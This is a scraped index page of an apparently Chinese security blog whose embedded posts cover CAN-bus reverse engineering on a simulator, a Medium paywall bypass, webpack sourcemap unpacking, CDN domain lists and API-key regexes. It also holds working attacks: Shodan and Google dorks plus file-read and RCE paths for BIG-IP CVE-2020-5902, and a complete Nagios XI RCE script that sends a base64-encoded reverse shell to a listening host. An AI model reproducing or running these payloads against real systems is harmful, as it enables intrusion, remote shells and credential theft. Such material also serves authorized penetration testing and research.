&lt;li&gt;关车门锁操作，执行&lt;code&gt;canplayer -I source&lt;/code&gt; 重放数据。确认车门锁是否开启。如果没有，请重复上面的步骤。&lt;/li&gt;
&lt;li&gt;输入 &lt;code&gt;wc -l source&lt;/code&gt; 命令查看文件行数。笔者这里结果为11407行。&lt;/li&gt;
&lt;li&gt;输入 &lt;code&gt;split -l 6000 source c1&lt;/code&gt; 将source文件分成两个文件。&lt;/li&gt;
&lt;li&gt;使用canplayer重放两个分割后的文件，查看重放的哪个文件打开来车门锁。每次重放前都要执行 &lt;code&gt;canplayer -I source&lt;/code&gt;。主要是保证每次重放分割的文件前车门锁是关闭的。&lt;/li&gt;
&lt;li&gt;根据第6和7的步骤对包含重放命令的文件进行。这里要注意每次split命令分割的行数减少1倍。例如第二次执行的名为 &lt;code&gt;split -l 3000 c1aa c2&lt;/code&gt; 。重放命令为 &lt;code&gt;canplayer -I c2aa&lt;/code&gt;和&lt;code&gt;canplayer -I c2ab&lt;/code&gt;。这样一直重复知道发现最终的数据包。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经过上面的重复，在13ab的文件中定位到来了ID值和发送的数据。使用 &lt;code&gt;cansend vcan0 19B#00000E000000&lt;/code&gt; 进行验证。打开车门锁成功。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01070f3b96da292d31.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;统计法&#34;&gt;统计法&lt;/h3&gt;
&lt;p&gt;对于一些只有在进行操作时才会产生的动作，可以通过选择特定的次数，对其发送的次数进行筛选。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用 &lt;code&gt;candump -l vcan0&lt;/code&gt; 捕获数据包。&lt;/li&gt;
&lt;li&gt;在控制器界面中操作5次车门锁操作。&lt;/li&gt;
&lt;li&gt;停止candump。获得保存文件，这里为&lt;code&gt;candump-2020-06-22_151059.log&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;通过编写好的脚本，运行 &lt;code&gt;python3 can.py candump-2020-06-22_151059.log&lt;/code&gt;获得结果&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t019248468c787ec30c.png&#34; alt=&#34;统计法逆向CAN&#34; title=&#34;统计法逆向CAN&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;脚本很简单，主要就是遍历所有数据，对ID进行计数统计并显示最终结果，输入ID值可显示对应的数据内容。使用python 20行代码就可以搞定。大家可以自己编写下。&lt;/p&gt;
&lt;h3 id=&#34;观察法&#34;&gt;观察法&lt;/h3&gt;
&lt;p&gt;有了上面的一些经验积累后，借助可视化界面来对数据进行观察也可以逆向出其总线ID。&lt;br&gt;
按照上面启动Kayak的方法，启动监听数据。工具已经对ID进行来分组。将模拟器，控制器和Kayak放在同一个屏幕上。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01908719cea2669673.png&#34; alt=&#34;Kayak观察法&#34; title=&#34;Kayak观察法&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在控制器界面按下左键，模拟器界面左转向灯闪了一下，观察Kayak界面数据变化，在左转向灯闪时（也就是按下左键时），看哪一个值变了又变会原值，并保持原值。最终定位ID值为188。&lt;/p&gt;
&lt;p&gt;现在在进行另外一个例子，在汽车加速过程中，转速表是一直在上升。这就可以通过观察哪一个值是在持续上升的。这里通过控制器界面，按住上方向键，观察哪一个值是在持续增加的。最终定位ID值为244。&lt;/p&gt;
&lt;p&gt;可以通过cansend来进行验证，是否成功。&lt;/p&gt;
&lt;p&gt;当然除了使用Kayak外，也可以尝试cansniffer。&lt;/p&gt;
&lt;h2 id=&#34;icsim难度设置&#34;&gt;ICSim难度设置&lt;/h2&gt;
&lt;p&gt;以上介绍的几种方法各有利弊，不能满足所有情况，实际的情况会非常复杂，需根据实际情况进行选择。&lt;br&gt;
对于CAN总线的分析，ICSim支持从0到3的4个级别，默认难度为1级，0为最简单，3是最难。还可以设置随机化的种子值。&lt;br&gt;
输入 &lt;code&gt;./icsim -r vcan0&lt;/code&gt; 命令可以显示出随机的种子值。当然也可以使用 &lt;code&gt;./icsim -s 1419525411 vcan0&lt;/code&gt; 来设置种子值，这样仿真器就可以选择不同的ID和目标字节位置了。&lt;br&gt;
输入 &lt;code&gt;./icsim -l 3 vcan0&lt;/code&gt; 命令设置挑战难度。&lt;br&gt;
大家可以自行尝试增加难度来进行挑战。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文主要以ICSim模拟CAN总线数据，通过多种方式来对CAN总线进行逆向分析，重在方法和工具使用。部分内容并未过多提及，如果一旦拓展开来，需要写的内容实在太多。感兴趣的大家可自行进行深入学习和了解。如果在进行实车的分析和测试也要注意自身安全，提前做好计划和保障。&lt;/p&gt;
&lt;h2 id=&#34;参考或引用来源&#34;&gt;参考或引用来源&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;https://github.com/zombieCraig/ICSim&lt;/li&gt;
&lt;li&gt;https://github.com/linux-can/can-utils&lt;/li&gt;
&lt;li&gt;https://github.com/dschanoeh/Kayak/releases&lt;/li&gt;
&lt;li&gt;https://tryhackme.com/room/carhacking101&lt;/li&gt;
&lt;li&gt;https://www.securitynewspaper.com/2018/05/03/hack-car-tool/&lt;/li&gt;
&lt;li&gt;https://github.com/jaredthecoder/awesome-vehicle-security#python&lt;/li&gt;
&lt;li&gt;https://dschanoeh.github.io/Kayak/tutorial.html&lt;/li&gt;
&lt;li&gt;https://www.hackers-arise.com/post/2017/08/08/automobile-hacking-part-2-the-can-utils-or-socketcan&lt;/li&gt;
&lt;li&gt;https://www.hackers-arise.com/post/2017/08/04/automobile-hacking-part-1-the-can-protocol&lt;/li&gt;
&lt;li&gt;https://en.wikipedia.org/wiki/CAN_bus&lt;/li&gt;
&lt;li&gt;https://mp.weixin.qq.com/s/jvzLn2ZTmId4cfqBNJxYyg&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;参考书籍或文档&#34;&gt;参考书籍或文档&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;《智能网联汽车安全》&lt;/li&gt;
&lt;li&gt;《汽车黑客大曝光》&lt;/li&gt;
&lt;li&gt;《Car Hacking: Accessing and Exploiting the CAN Bus Protocol》&lt;/li&gt;
&lt;/ol&gt;
">Hacking All The Cars之CAN总线逆向</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/medium-bypass-via-google-cache/"" data-c="
          &lt;p&gt;Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。&lt;/p&gt;
&lt;p&gt;其实通过Google cache就可以绕过限制继续查看。&lt;/p&gt;
&lt;p&gt;例如我们要查看下面的文章，发现看不了。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1595423164903.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;!-- more --&gt;
&lt;p&gt;我们通过标题搜索到medium的文章，然后点击cache。打开后，过一会会跳转显示404错误。但是，我们可以按F12打开控制台，切换到network标签，在按F5刷新下，找到带有google cache的链接。点击右侧的preview就可以查看到原文内容。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1595423337573.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;就可以看到内容了。如果看着不方便，可以复制出来。另外，该页面由js控制，通过burp类的代理工具，在查看时将js的链接地址全部过滤掉即可，直接在网页中查看，无需打开控制台。当然这里也可以通过爬虫的方式获取。&lt;/p&gt;
&lt;p&gt;其实对于绕过来说，还可以通过代理，创建多个账号等方式。这里大家跟进实际情况，自己选择吧。&lt;/p&gt;
">免费查看Medium付费内容</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/big-ip-cve-2020-5902-check-poc/"" data-c="
          &lt;p&gt;7月1日，F5发布公告，其流量管理用户接口（Traffic Management User Interface ，简称TMUI)，也称为配置实用程序（Configuration utility）。该系统存在一处RCE漏洞。CVE编号为CVE-2020-5902。&lt;/p&gt;
&lt;h2 id=&#34;搜索目标&#34;&gt;搜索目标：&lt;/h2&gt;
&lt;p&gt;注：请将下面的%26替换为&amp;amp;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;&lt;br&gt;
http.favicon.hash:-335242539&lt;/p&gt;
&lt;p&gt;http.title:&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;&lt;br&gt;
title=&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;&lt;br&gt;
443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;
&lt;p&gt;443.https.get.title:&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;&lt;br&gt;
inurl:&amp;quot;tmui/login.jsp&amp;quot;&lt;/p&gt;
&lt;p&gt;intitle:&amp;quot;BIG-IP&amp;quot; inurl:&amp;quot;tmui&amp;quot;&lt;/p&gt;
&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h2&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp&lt;/p&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;文件读取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RCE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin （没测试成功）&lt;/p&gt;
&lt;p&gt;相关内容可以看其他地址的总结：&lt;br&gt;
&lt;a href=&#34;http://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/&#34;&gt;http://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/jas502n/CVE-2020-5902&#34;&gt;https://github.com/jas502n/CVE-2020-5902&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以上漏洞poc来自网络，请勿用于非法攻击。仅用于安全测试和自身安全检测。否则造成的一切后果自负，且与本人无关。&lt;/p&gt;
">BIG IP CVE-2020-5902 漏洞检测和利用</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/nagiosxi-rce-1/"" data-c="
          &lt;p&gt;登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。&lt;/p&gt;
&lt;h2 id=&#34;简要信息&#34;&gt;简要信息&lt;/h2&gt;
&lt;p&gt;版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的 &lt;code&gt;-&lt;/code&gt; 去掉）&lt;br&gt;
条件：登陆后&lt;br&gt;
漏洞文件相关路径：/includes/components/xicore/export-rrd.php、includes/utils-rrdexport.inc.php&lt;br&gt;
漏洞参数：step、start、end&lt;/p&gt;
&lt;h2 id=&#34;环境&#34;&gt;环境&lt;/h2&gt;
&lt;p&gt;python3&lt;br&gt;
requests库，使用pip3安装即可。&lt;code&gt;python3 -m pip install requests&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;运行&#34;&gt;运行&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先在远程机器上监听端口，用于反弹。命令：nc -l -v -p 4444&lt;/li&gt;
&lt;li&gt;python3 nagiox.py target   (注：需带协议，如http或https)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另外，如果需要执行自己的命令，需要修改commond变量就可以了，这里也懒得改了。脚本中的命令&lt;code&gt;&amp;quot;1|(echo+\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;&lt;/code&gt;&lt;br&gt;
其实就是执行的&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.20/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1590571293255.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;代码保存为py文件&#34;&gt;代码（保存为py文件）&lt;/h2&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import sys, re 
import requests 

user = &#39;nagiosadmin&#39; 
pwd = &#39;nagiosadmin&#39; 
 
def main():
    print(&amp;quot;You need runing nc -l -vv -p 4444 at server.&amp;quot;)
    session = requests.session() 
    baseUrl = target + &#39;/nagiosxi/&#39;     
    checkBaseUrl = session.get(baseUrl)     
    checkBaseResp = checkBaseUrl.text 
    
    nsp_patt = &amp;quot;var nsp_str = \&amp;quot;(.*?)\&amp;quot;&amp;quot; 
    find_nsp = re.compile(nsp_patt)     
    found_nsp = re.search(find_nsp, checkBaseResp)     
    if found_nsp:         
        nsp_val = found_nsp.group(1)         
        print(&#39;nsp value found: %s&#39; % ( nsp_val ) )    
        loginurl = baseUrl + &#39;/login.php&#39;        
        data_login = {&#39;nsp&#39;: nsp_val,&#39;page&#39;: &#39;auth&#39;, &#39;debug&#39;:&#39;&#39;, &#39;pageopt&#39;:&#39;login&#39;,&#39;redirect&#39;:&#39;http://192.168.121.139/nagiosxi/index.php&#39;,&#39;username&#39;:user, &#39;password&#39;:pwd,&#39;loginButton&#39;:&#39;&#39;} 
        req = session.post(loginurl, data=data_login, verify=False, allow_redirects=True)         
        status_code = req.status_code
        resp = req.text
        
        if status_code == 200:                    
            commond = &amp;quot;1|(echo+\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;             
            
            req = &amp;quot;{}/includes/components/xicore/export-rrd.php?host=localhost&amp;amp;service=Root%20Partition&amp;amp;start=1584108670&amp;amp;end=1584195130&amp;amp;step={}&amp;amp;type=a&amp;amp;nsp={}&amp;quot;.format(baseUrl,commond,nsp_val)
            execsh = session.get(req, verify=False, allow_redirects=True)             
            print(execsh.text)

if __name__ == &#39;__main__&#39;:    
    target = sys.argv[1] 
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">Nagiosxi的一个RCE漏洞利用脚本</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/unpack-webpack-via-sourcemap/"" data-c="
          &lt;p&gt;现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环境中使用。这使得我们有了机会。&lt;/p&gt;
&lt;p&gt;在实际渗透过程中，许多网站还是存在这种情况。通常一般是配置了&lt;code&gt;devtool: &#39;source-map&#39;&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;我们可以在js的文件名后面加上.map，如果在这种该文件，我们则可以通过工具解压缩webpack。&lt;/p&gt;
&lt;p&gt;或者当我们一般看到类似这样的代码时，也基本可以对其进行解压缩。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1589786576692.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;p&gt;可以使用的工具有：&lt;/p&gt;
&lt;h3 id=&#34;1-sourcedetector&#34;&gt;1. SourceDetector&lt;/h3&gt;
&lt;p&gt;地址：&lt;a href=&#34;https://github.com/SunHuawei/SourceDetector&#34;&gt;https://github.com/SunHuawei/SourceDetector&lt;/a&gt;&lt;br&gt;
这个工具是chrome浏览器的插件，gogole商店中没有该插件，需要自己编译，这里遇到些坑，给大家说下编译的流程（以下环境为macos下）。&lt;/p&gt;
&lt;h4 id=&#34;安装&#34;&gt;安装&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;安装nvm。&lt;code&gt;brew install nvm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;安装nodejs。 &lt;code&gt;nvm install v11.15.0&lt;/code&gt;  (注意，由于工具是2017年发布，新版本node会有问题，所以使用老版本)&lt;/li&gt;
&lt;li&gt;安装bower和gulp。 &lt;code&gt;npm install bower&lt;/code&gt;， &lt;code&gt;npm install gulp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;git clone https://github.com/SunHuawei/SourceDetector.git&lt;/li&gt;
&lt;li&gt;npm install&lt;/li&gt;
&lt;li&gt;bower install&lt;/li&gt;
&lt;li&gt;gulp&lt;/li&gt;
&lt;li&gt;打开Chrome设置-扩展程序&lt;/li&gt;
&lt;li&gt;点击&amp;quot;加载已解压的扩展程序...&amp;quot;&lt;/li&gt;
&lt;li&gt;选择path/to/source-detector/dist目录&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;使用&#34;&gt;使用&lt;/h4&gt;
&lt;p&gt;使用很简单，开启插件，我们正常浏览网站即可，该插件会自动请求网站中是否存在.map文件。如果存在，会提示器数量。点开插件后，我们可以点击链接直接下载代码包至本地。使用简单方便。大家可以看作者的文章&lt;a href=&#34;https://zhuanlan.zhihu.com/p/26033573&#34;&gt;https://zhuanlan.zhihu.com/p/26033573&lt;/a&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1589782830447.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2restore-source-tree&#34;&gt;2.restore source tree&lt;/h3&gt;
&lt;p&gt;地址：&lt;a href=&#34;https://github.com/alexkuz/restore-source-tree&#34;&gt;https://github.com/alexkuz/restore-source-tree&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我测试了下，有的可能下载不回来文件。&lt;/p&gt;
&lt;h4 id=&#34;安装-2&#34;&gt;安装&lt;/h4&gt;
&lt;p&gt;这个是命令行工具。安装好npm后，直接 &lt;code&gt;npm i -g restore-source-tree&lt;/code&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;使用-2&#34;&gt;使用&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;下载.map文件。&lt;/li&gt;
&lt;li&gt;restore-source-tree --out-dir &amp;lt;OUT_DIR&amp;gt; &lt;FILE&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;既然可以解开文件了，就可以想以前一样进行分析和挖掘了。可以尝试寻找是否有隐藏的敏感信息，发现新的输入点，挖掘xss等。&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;我们需要了解下webpack和sroucemap。&lt;/p&gt;
&lt;h3 id=&#34;什么是webpack&#34;&gt;什么是webpack&lt;/h3&gt;
&lt;p&gt;webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。——来自官网说明&lt;/p&gt;
&lt;h3 id=&#34;什么是sourcemap&#34;&gt;什么是sourcemap&lt;/h3&gt;
&lt;p&gt;sourcemap是为了解决开发代码与实际运行代码不一致时，帮助我们方便在浏览器中调试代码的技术，它本身只是一个独立的map文件，与源码在同一个目录下。详细内容可以看&lt;a href=&#34;http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html&#34;&gt;JavaScript Source Map 详解&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;我们经常遇到的前端代码经过webpack打包压缩为一个文件，使得调试和分析变得头痛。那么sourcemap可以让开发者方便的调试。如果部署到线上没有关闭sourcemap，这就让我们可以如开发者一样调试js代码。&lt;/p&gt;
&lt;p&gt;本身网络上的文章讲解的很清楚了，我这里不做过多解释。请看后文参考。&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html&lt;/li&gt;
&lt;li&gt;https://www.webpackjs.com/concepts/&lt;/li&gt;
&lt;li&gt;https://zhuanlan.zhihu.com/p/26033573&lt;/li&gt;
&lt;li&gt;https://mp.weixin.qq.com/s/LRRycBY9ERIMBEh-MKjBCw&lt;/li&gt;
&lt;/ol&gt;
">通过sourcemap解压缩webpack 实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/some-waf-cdn-lb-list/"" data-c="
          &lt;p&gt;在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以跳过端口检查，节省时间。&lt;/p&gt;
&lt;p&gt;以下列表主要收集了一些大型互联网企业（腾讯、百度、滴滴、字节跳动、360、阿里巴巴、美团、京东等），然后经过人工整理出来，有遗漏在所难免，欢迎大家补充。&lt;/p&gt;
&lt;p&gt;w.alikunlun.com&lt;br&gt;
wsglb0.com&lt;br&gt;
w.kunlunpi.com&lt;br&gt;
elb.amazonaws.com&lt;br&gt;
wswebpic.com&lt;br&gt;
mig.tencent-cloud.net&lt;br&gt;
cloud.tc.qq.com&lt;br&gt;
qcloudcjgj.com&lt;br&gt;
pop3.mxhichina.com&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;smtp.mxhichina.com&lt;br&gt;
mail.mxhichina.com&lt;br&gt;
alibabadns.com&lt;br&gt;
w.kunlunle.com&lt;br&gt;
alicdn.com&lt;br&gt;
wagbridge.alibaba.com&lt;br&gt;
cdn20.com&lt;br&gt;
wscdns.com&lt;br&gt;
yjs-cdn.com&lt;br&gt;
yunjiasu-cdn.net&lt;br&gt;
jomodns.com&lt;br&gt;
bdydns.com&lt;br&gt;
cdn.cloudflare.net&lt;br&gt;
iotacdn.net&lt;br&gt;
kxcdn.com&lt;br&gt;
ks-cdn.com&lt;br&gt;
chinacache.net&lt;br&gt;
w.kunlunar.com&lt;br&gt;
ksyuncdn.com&lt;br&gt;
cdn.dnsv1.com&lt;br&gt;
waf.didiyun.com&lt;br&gt;
cdntip.com&lt;br&gt;
s3-cname.didiyunapi.com&lt;br&gt;
qhcdn.com&lt;br&gt;
qss-lb.com&lt;br&gt;
cloudcdn.net&lt;br&gt;
ccgslb.net&lt;br&gt;
qh-lb.com&lt;br&gt;
360qhcdn.com&lt;br&gt;
qh-cdn.com&lt;br&gt;
yundun_external.vcloudgtm.com&lt;br&gt;
360vcloud.com&lt;br&gt;
360wzb.com&lt;br&gt;
cloudglb.com&lt;br&gt;
qihucdn.cn&lt;br&gt;
qihucdn.com&lt;br&gt;
alibabadns.com&lt;br&gt;
bytedns.net&lt;br&gt;
cdn.bytedance.com&lt;br&gt;
w.kunlunca.com&lt;br&gt;
cdngslb.com&lt;br&gt;
w.kunluncan.com&lt;br&gt;
akadns.net&lt;br&gt;
w.cdngslb.com&lt;br&gt;
w.kunlungr.com&lt;br&gt;
bsgslb.com&lt;br&gt;
netdna-cdn.com&lt;br&gt;
cdn.aliyun.com&lt;br&gt;
cdn.aliyuncs.com&lt;br&gt;
error.aliyundun.com&lt;br&gt;
error.aliyundun.net&lt;br&gt;
errors.aliyundun.com&lt;br&gt;
errors.aliyundun.net&lt;br&gt;
error.aliyun.net&lt;br&gt;
error.aliyun.com&lt;br&gt;
errors.aliyun.net&lt;br&gt;
errors.aliyun.com&lt;br&gt;
cloudfloordns.com&lt;br&gt;
hwclouds.com&lt;br&gt;
cdn.sucuri.net&lt;br&gt;
waf.tencentcloud.com&lt;br&gt;
waf.tencent-cloud.com&lt;br&gt;
wangshan.360.cn&lt;br&gt;
gslb.qianxun.com&lt;br&gt;
jdcloudcs.com&lt;br&gt;
jcloudlb.com&lt;br&gt;
jdcloudwaf.com&lt;/p&gt;
&lt;p&gt;企业邮箱&lt;br&gt;
qiye.163.com&lt;br&gt;
outlook.com&lt;br&gt;
office.com&lt;br&gt;
exmail.qq.com&lt;/p&gt;
">一些流行的云waf、cdn、lb的域名列表（80条）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Extract-API-Keys-From-Regex/"" data-c="
          &lt;p&gt;分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。&lt;br&gt;
在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;aliyun_oss_url&amp;quot;: &amp;quot;[\\w-.]\\.oss.aliyuncs.com&amp;quot; 
&amp;quot;azure_storage&amp;quot;: &amp;quot;https?://[\\w-\.]\\.file.core.windows.net&amp;quot;
&amp;quot;access_key&amp;quot;: &amp;quot;[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)&amp;quot;
&amp;quot;secret_key&amp;quot;: &amp;quot;[Ss](ecret|ECRET)_?[Kk](ey|EY)&amp;quot;
&amp;quot;slack_token&amp;quot;: &amp;quot;(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})&amp;quot;
&amp;lt;!-- more --&amp;gt;

&amp;quot;slack_webhook&amp;quot;: &amp;quot;https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}&amp;quot;
&amp;quot;facebook_oauth&amp;quot;: &amp;quot;[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}[&#39;\&amp;quot;\\s][0-9a-f]{32}[&#39;\&amp;quot;\\s]&amp;quot;,
&amp;quot;twitter_oauth&amp;quot;: &amp;quot;[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}[&#39;\&amp;quot;\\s][0-9a-zA-Z]{35,44}[&#39;\&amp;quot;\\s]&amp;quot;
&amp;quot;heroku_api&amp;quot;: &amp;quot;[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}&amp;quot;
&amp;quot;mailgun_api&amp;quot;: &amp;quot;key-[0-9a-zA-Z]{32}&amp;quot;
&amp;quot;mailchamp_api&amp;quot;: &amp;quot;[0-9a-f]{32}-us[0-9]{1,2}&amp;quot;
&amp;quot;picatic_api&amp;quot;: &amp;quot;sk_live_[0-9a-z]{32}&amp;quot;
&amp;quot;google_oauth_id&amp;quot;: &amp;quot;[0-9(+-[0-9A-Za-z_]{32}.apps.qooqleusercontent.com&amp;quot;
&amp;quot;google_api&amp;quot;: &amp;quot;AIza[0-9A-Za-z-_]{35}&amp;quot;
&amp;quot;google_captcha&amp;quot;: &amp;quot;6L[0-9A-Za-z-_]{38}&amp;quot;
&amp;quot;google_oauth&amp;quot;: &amp;quot;ya29\\.[0-9A-Za-z\\-_]+&amp;quot;
&amp;quot;amazon_aws_access_key_id&amp;quot;: &amp;quot;AKIA[0-9A-Z]{16}&amp;quot;
&amp;quot;amazon_mws_auth_token&amp;quot;: &amp;quot;amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}&amp;quot;
&amp;quot;amazonaws_url&amp;quot;: &amp;quot;s3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com&amp;quot;
&amp;quot;facebook_access_token&amp;quot;: &amp;quot;EAACEdEose0cBA[0-9A-Za-z]+&amp;quot;
&amp;quot;mailgun_api_key&amp;quot;: &amp;quot;key-[0-9a-zA-Z]{32}&amp;quot;
&amp;quot;twilio_api_key&amp;quot;: &amp;quot;SK[0-9a-fA-F]{32}&amp;quot;
&amp;quot;twilio_account_sid&amp;quot;: &amp;quot;AC[a-zA-Z0-9_\\-]{32}&amp;quot;
